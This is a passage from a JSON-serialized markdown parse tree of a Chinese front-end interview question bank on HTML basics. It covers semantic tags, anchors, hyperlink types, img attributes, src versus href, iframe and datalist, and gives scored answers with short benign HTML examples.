分）</h4>\\n<p>datalist标签，用来定义选项列表，与input元素配合使用该元素，来定义input可能的值。</p>\\n<p>datalist及其选项不会被显示出来，他仅仅是合法的输入列表值。</p>\\n<pre><code class=\\"language-html\\">&lt;input id=&quot;fruits&quot; list=&quot;fruit&quot; /&gt;&lt;datalist id=&quot;fruit&quot;&gt;  &lt;option value=&quot;apple&quot;&gt;  &lt;option value=&quot;orange&quot;&gt;  &lt;option value=&quot;banana&quot;&gt;&lt;/datalist&gt;\\n</code></pre>\\n","ast":[{"type":"heading","raw":"# HTML\\n\\n","depth":1,"text":"HTML","tokens":[{"type":"text","raw":"HTML","text":"HTML","escaped":false}]},{"type":"heading","raw":"## 1. 什么是静态网页？什么是动态网页？\\n\\n","depth":2,"text":"1. 什么是静态网页？什么是动态网页？","tokens":[{"type":"text","raw":"1. 什么是静态网页？什么是动态网页？","text":"1. 什么是静态网页？什么是动态网页？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","task":false,"loose":false,"text":"**2：** 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","tokens":[{"type":"text","raw":"**2：** 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","text":"**2：** 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","text":" 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 2. 谈谈你对 HTML 语义化的理解\\n\\n","depth":2,"text":"2. 谈谈你对 HTML 语义化的理解","tokens":[{"type":"text","raw":"2. 谈谈你对 HTML 语义化的理解","text":"2. 谈谈你对 HTML 语义化的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** What：通过语义化标签对网站进行结构化；\\n- **1：** Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；\\n- **1：** How：`header`-文档头、`nav`-导航区、`section`-文档块、`article`-内容、`aside`-侧边栏-广告栏、`footer`-文档脚注；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** What：通过语义化标签对网站进行结构化；\\n","task":false,"loose":false,"text":"**1：** What：通过语义化标签对网站进行结构化；","tokens":[{"type":"text","raw":"**1：** What：通过语义化标签对网站进行结构化；","text":"**1：** What：通过语义化标签对网站进行结构化；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" What：通过语义化标签对网站进行结构化；","text":" What：通过语义化标签对网站进行结构化；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；\\n","task":false,"loose":false,"text":"**1：** Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；","tokens":[{"type":"text","raw":"**1：** Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；","text":"**1：** Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；","text":" Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** How：`header`-文档头、`nav`-导航区、`section`-文档块、`article`-内容、`aside`-侧边栏-广告栏、`footer`-文档脚注；","task":false,"loose":false,"text":"**1：** How：`header`-文档头、`nav`-导航区、`section`-文档块、`article`-内容、`aside`-侧边栏-广告栏、`footer`-文档脚注；","tokens":[{"type":"text","raw":"**1：** How：`header`-文档头、`nav`-导航区、`section`-文档块、`article`-内容、`aside`-侧边栏-广告栏、`footer`-文档脚注；","text":"**1：** How：`header`-文档头、`nav`-导航区、`section`-文档块、`article`-内容、`aside`-侧边栏-广告栏、`footer`-文档脚注；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" How：","text":" How：","escaped":false},{"type":"codespan","raw":"`header`","text":"header"},{"type":"text","raw":"-文档头、","text":"-文档头、","escaped":false},{"type":"codespan","raw":"`nav`","text":"nav"},{"type":"text","raw":"-导航区、","text":"-导航区、","escaped":false},{"type":"codespan","raw":"`section`","text":"section"},{"type":"text","raw":"-文档块、","text":"-文档块、","escaped":false},{"type":"codespan","raw":"`article`","text":"article"},{"type":"text","raw":"-内容、","text":"-内容、","escaped":false},{"type":"codespan","raw":"`aside`","text":"aside"},{"type":"text","raw":"-侧边栏-广告栏、","text":"-侧边栏-广告栏、","escaped":false},{"type":"codespan","raw":"`footer`","text":"footer"},{"type":"text","raw":"-文档脚注；","text":"-文档脚注；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 3. 谈谈你对锚点的理解\\n\\n","depth":2,"text":"3. 谈谈你对锚点的理解","tokens":[{"type":"text","raw":"3. 谈谈你对锚点的理解","text":"3. 谈谈你对锚点的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；\\n- **1：** How：`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`、`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`、``；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；\\n","task":false,"loose":false,"text":"**1：** What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；","tokens":[{"type":"text","raw":"**1：** What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；","text":"**1：** What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；","text":" What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** How：`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`、`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`、``；","task":false,"loose":false,"text":"**1：** How：`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`、`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`、``；","tokens":[{"type":"text","raw":"**1：** How：`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`、`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`、``；","text":"**1：** How：`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`、`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`、``；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" How：","text":" How：","escaped":false},{"type":"codespan","raw":"`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`","text":"<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`","text":"<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>"},{"type":"text","raw":"、``；","text":"、``；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 4. 超链接有哪些常见的表现形式？\\n\\n","depth":2,"text":"4. 超链接有哪些常见的表现形式？","tokens":[{"type":"text","raw":"4. 超链接有哪些常见的表现形式？","text":"4. 超链接有哪些常见的表现形式？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：**\\n  + 跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`\\n  + 下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`\\n  + 锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`\\n  + 邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`\\n  + 空链接：返回页面顶部，`<a href=\\"\\">​</a>`\\n  + 代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：**\\n  + 跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`\\n  + 下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`\\n  + 锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`\\n  + 邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`\\n  + 空链接：返回页面顶部，`<a href=\\"\\">​</a>`\\n  + 代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","task":false,"loose":false,"text":"**2：**\\n+ 跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`\\n+ 下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`\\n+ 锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`\\n+ 邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`\\n+ 空链接：返回页面顶部，`<a href=\\"\\">​</a>`\\n+ 代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","tokens":[{"type":"text","raw":"**2：**\\n","text":"**2：**","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]}]},{"type":"list","raw":"+ 跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`\\n+ 下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`\\n+ 锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`\\n+ 邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`\\n+ 空链接：返回页面顶部，`<a href=\\"\\">​</a>`\\n+ 代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`\\n","task":false,"loose":false,"text":"跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`","tokens":[{"type":"text","raw":"跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`","text":"跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`","tokens":[{"type":"text","raw":"跳转链接：页面跳转，","text":"跳转链接：页面跳转，","escaped":false},{"type":"codespan","raw":"`<a href=\\"http://www.baidu.com\\">百度</a>`","text":"<a href=\\"http://www.baidu.com\\">百度</a>"}]}]},{"type":"list_item","raw":"+ 下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`\\n","task":false,"loose":false,"text":"下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`","tokens":[{"type":"text","raw":"下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`","text":"下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`","tokens":[{"type":"text","raw":"下载链接：下载资源，","text":"下载链接：下载资源，","escaped":false},{"type":"codespan","raw":"`<a href=\\"data.zip\\">本地</a>`","text":"<a href=\\"data.zip\\">本地</a>"}]}]},{"type":"list_item","raw":"+ 锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`\\n","task":false,"loose":false,"text":"锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`","tokens":[{"type":"text","raw":"锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`","text":"锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`","tokens":[{"type":"text","raw":"锚点链接：锚点跳转，","text":"锚点链接：锚点跳转，","escaped":false},{"type":"codespan","raw":"`<a href=\\"#know\\">​</a>`","text":"<a href=\\"#know\\">​</a>"}]}]},{"type":"list_item","raw":"+ 邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`\\n","task":false,"loose":false,"text":"邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`","tokens":[{"type":"text","raw":"邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`","text":"邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`","tokens":[{"type":"text","raw":"邮箱链接：唤起邮箱，","text":"邮箱链接：唤起邮箱，","escaped":false},{"type":"codespan","raw":"`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`","text":"<a href=\\"mailto:xxx@xxx.com\\">xxx</a>"}]}]},{"type":"list_item","raw":"+ 空链接：返回页面顶部，`<a href=\\"\\">​</a>`\\n","task":false,"loose":false,"text":"空链接：返回页面顶部，`<a href=\\"\\">​</a>`","tokens":[{"type":"text","raw":"空链接：返回页面顶部，`<a href=\\"\\">​</a>`","text":"空链接：返回页面顶部，`<a href=\\"\\">​</a>`","tokens":[{"type":"text","raw":"空链接：返回页面顶部，","text":"空链接：返回页面顶部，","escaped":false},{"type":"codespan","raw":"`<a href=\\"\\">​</a>`","text":"<a href=\\"\\">​</a>"}]}]},{"type":"list_item","raw":"+ 代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","task":false,"loose":false,"text":"代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","tokens":[{"type":"text","raw":"代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","text":"代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","tokens":[{"type":"text","raw":"代码块：执行代码，","text":"代码块：执行代码，","escaped":false},{"type":"codespan","raw":"`<a href=\\"javascript:void(0);\\">​</a>`","text":"<a href=\\"javascript:void(0);\\">​</a>"}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 5. img 标签的 title 和 alt 属性作用\\n\\n","depth":2,"text":"5. img 标签的 title 和 alt 属性作用","tokens":[{"type":"text","raw":"5. img 标签的 title 和 alt 属性作用","text":"5. img 标签的 title 和 alt 属性作用","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** `title`属性是当鼠标悬停在图片上时，显示的提示文本；`alt`属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** `title`属性是当鼠标悬停在图片上时，显示的提示文本；`alt`属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","task":false,"loose":false,"text":"**1：** `title`属性是当鼠标悬停在图片上时，显示的提示文本；`alt`属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","tokens":[{"type":"text","raw":"**1：** `title`属性是当鼠标悬停在图片上时，显示的提示文本；`alt`属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","text":"**1：** `title`属性是当鼠标悬停在图片上时，显示的提示文本；`alt`属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" ","escaped":false},{"type":"codespan","raw":"`title`","text":"title"},{"type":"text","raw":"属性是当鼠标悬停在图片上时，显示的提示文本；","text":"属性是当鼠标悬停在图片上时，显示的提示文本；","escaped":false},{"type":"codespan","raw":"`alt`","text":"alt"},{"type":"text","raw":"属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","text":"属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 6. src 与 href 的区别\\n\\n","depth":2,"text":"6. src 与 href 的区别","tokens":[{"type":"text","raw":"6. src 与 href 的区别","text":"6. src 与 href 的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** `src`属性是资源路径，引入资源，属于当前页不可缺少的部分，如：`src=\\"http://www.baidu.com/logo.png\\"`；`href`属性是超链接，引用资源，表示该资源与当前页有关联，如：`href=\\"http://www.baidu.com\\"`。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** `src`属性是资源路径，引入资源，属于当前页不可缺少的部分，如：`src=\\"http://www.baidu.com/logo.png\\"`；`href`属性是超链接，引用资源，表示该资源与当前页有关联，如：`href=\\"http://www.baidu.com\\"`。","task":false,"loose":false,"text":"**1：** `src`属性是资源路径，引入资源，属于当前页不可缺少的部分，如：`src=\\"http://www.baidu.com/logo.png\\"`；`href`属性是超链接，引用资源，表示该资源与当前页有关联，如：`href=\\"http://www.baidu.com\\"`。","tokens":[{"type":"text","raw":"**1：** `src`属性是资源路径，引入资源，属于当前页不可缺少的部分，如：`src=\\"http://www.baidu.com/logo.png\\"`；`href`属性是超链接，引用资源，表示该资源与当前页有关联，如：`href=\\"http://www.baidu.com\\"`。","text":"**1：** `src`属性是资源路径，引入资源，属于当前页不可缺少的部分，如：`src=\\"http://www.baidu.com/logo.png\\"`；`href`属性是超链接，引用资源，表示该资源与当前页有关联，如：`href=\\"http://www.baidu.com\\"`。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" ","escaped":false},{"type":"codespan","raw":"`src`","text":"src"},{"type":"text","raw":"属性是资源路径，引入资源，属于当前页不可缺少的部分，如：","text":"属性是资源路径，引入资源，属于当前页不可缺少的部分，如：","escaped":false},{"type":"codespan","raw":"`src=\\"http://www.baidu.com/logo.png\\"`","text":"src=\\"http://www.baidu.com/logo.png\\""},{"type":"text","raw":"；","text":"；","escaped":false},{"type":"codespan","raw":"`href`","text":"href"},{"type":"text","raw":"属性是超链接，引用资源，表示该资源与当前页有关联，如：","text":"属性是超链接，引用资源，表示该资源与当前页有关联，如：","escaped":false},{"type":"codespan","raw":"`href=\\"http://www.baidu.com\\"`","text":"href=\\"http://www.baidu.com\\""},{"type":"text","raw":"。","text":"。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 7. iframe 有哪些特点（优缺点）？\\n\\n","depth":2,"text":"7. iframe 有哪些特点（优缺点）？","tokens":[{"type":"text","raw":"7. iframe 有哪些特点（优缺点）？","text":"7. iframe 有哪些特点（优缺点）？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **2：** 优点：\\n  + 内容独立：iframe 中的元素、变量、样式是独立的；\\n  + 并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；\\n  + 灵活性强：可以引入各类网站，即使跨域；\\n- **2：** 缺点：\\n  + 不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；\\n  + 性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；\\n  + 通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 优点：\\n  + 内容独立：iframe 中的元素、变量、样式是独立的；\\n  + 并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；\\n  + 灵活性强：可以引入各类网站，即使跨域；\\n","task":false,"loose":false,"text":"**2：** 优点：\\n+ 内容独立：iframe 中的元素、变量、样式是独立的；\\n+ 并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；\\n+ 灵活性强：可以引入各类网站，即使跨域；","tokens":[{"type":"text","raw":"**2：** 优点：\\n","text":"**2：** 优点：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 优点：","text":" 优点：","escaped":false}]},{"type":"list","raw":"+ 内容独立：iframe 中的元素、变量、样式是独立的；\\n+ 并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；\\n+ 灵活性强：可以引入各类网站，即使跨域；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 内容独立：iframe 中的元素、变量、样式是独立的；\\n","task":false,"loose":false,"text":"内容独立：iframe 中的元素、变量、样式是独立的；","tokens":[{"type":"text","raw":"内容独立：iframe 中的元素、变量、样式是独立的；","text":"内容独立：iframe 中的元素、变量、样式是独立的；","tokens":[{"type":"text","raw":"内容独立：iframe 中的元素、变量、样式是独立的；","text":"内容独立：iframe 中的元素、变量、样式是独立的；","escaped":false}]}]},{"type":"list_item","raw":"+ 并行加载：浏览器可以同时加载一个页面中多个 iframe 